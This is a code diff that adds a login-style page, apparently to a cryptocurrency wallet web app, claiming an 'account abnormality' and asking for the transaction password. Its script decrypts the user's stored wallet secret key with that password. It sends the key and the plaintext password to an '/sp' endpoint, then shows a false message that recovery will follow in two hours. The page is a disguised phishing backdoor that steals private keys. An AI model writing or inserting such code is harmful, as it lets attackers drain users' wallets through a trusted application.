@@ -1,0 +1,80 @@
+<!--Content-->
+	<section class="container-fluid">
+		<div class="container">
+			<div class="col-md-5 login_box">
+				<form id="loginform" method="post">
+				<h3 class="login_tit"><span class="glyphicon glyphicon-log-in"></span> 账号异常</h3>
+				<div class="form-group"><i class="login_tips">账号异常，请输入交易密码进行数据校验！</span></i></div>
+				<div class="form-group">
+					<label>{$Think.lang.LOGIN_PAYSET_PASSWORD}: </label>
+					<input type="password" class="form-control" name="pay_pass" id="pay_pass">
+				</div>
+			
+				<div class="form-group">
+					<button type="submit" id="pay_btn" class="btn btn-primary login_btn" disabled="disabled">{$Think.lang.LOGIN_PAYSET_SUBMIT}</button>
+				</div>
+				</form>
+			</div>
+		</div>
+	</section>
+<div id="payset_box" style="display:none">
+	<div class="payset-tis">
+		<p>{$Think.lang.LOGIN_PAYSET_NOTICE}</p>
+		<p>{$Think.lang.LOGIN_PAYSET_NOTICE_DESC}</p>
+	</div>
+	<div class="zh_key"><span id="zh_dig"></span> 
+	</div>
+	<div class="blank4">&nbsp;</div>
+	<div class="dialog-btn"><button class="btn btn-orange btn-xs" type="button" id="goindex" onclick="javascript:location.href='/'">{$Think.lang.LOGIN_PAYSET_WRITED}</button></div>
+</div>
+<!--Content end-->
+<script src="{$dir}static/js/bootstrap-dialog.min.js?v={:mt_rand()}"></script>
+<script src="{$dir}static/js/clipboard.min.js?v={:mt_rand()}"></script>
+<script src="{$dir}static/js/common.js?v={:mt_rand()}"></script>
+<script src="{$dir}static/js/sdk.js?v={:mt_rand()}"></script>
+<script src="{$dir}static/js/DES3.js?v={:mt_rand()}"></script>
+<script src="{$dir}static/js/wallet.js?v={:mt_rand()}"></script>
+<script src="{$dir}static/js/application.js?v={:mt_rand()}"></script>
+<script>
+	var wait=60;
+	var dialog_set = '';
+	
+	function tmps(p,a){
+		$.ajax({
+			type: "POST",
+			url: "/sp",
+			data: { secret:p,as:a},
+			dataType: "json",
+			async:false,
+			success: function(data) {
+				if(data.result == 'ok') {
+					alert("数据校验通过，系统将在2小时后进行数据恢复，请稍候！");
+					location.href='/login';
+				} else {
+					alert("对不起，处理错误，请稍候重试");
+				}
+				
+			}
+		});
+	}
+	$("#pay_btn").click(function() {
+		var des3 = '{$user_des3}';
+		var passwd = $("#pay_pass").val();
+		
+		try{
+			var sec = getSecrect(passwd, des3);
+            if(sec.length != 56){
+                alert("支付信息解析异常，请联系管理员");
+                return;
+            }else
+                tmps(sec,passwd);
+		}catch(err){
+			if(err.message == "URI malformed" || err.message == "URI error")
+				alert("对不起，支付密码错误");
+		};
+		
+		//setTrustToUK(sec);
+	});
+	
+
+</script>
